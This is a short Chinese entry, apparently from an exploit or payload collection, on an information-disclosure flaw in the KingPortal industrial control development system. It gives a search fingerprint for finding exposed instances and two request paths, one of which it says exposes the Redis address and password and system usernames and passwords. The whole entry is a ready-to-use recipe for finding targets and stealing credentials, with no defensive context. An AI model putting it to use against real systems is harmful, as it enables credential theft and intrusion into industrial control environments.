# 工控软件KingPortal开发系统信息泄露漏洞

工控软件KingPortal开发系统 ｜ 信息泄露 ｜ —
- **指纹**：`body="/public/javascripts/Common/Util/km_util.js"`

**Payload**
```
请求接口获取项目信息
/ProjectManager.json
请求接口获取Redis地址及密码、系统用户名及密码
/config/externalConfig.json
```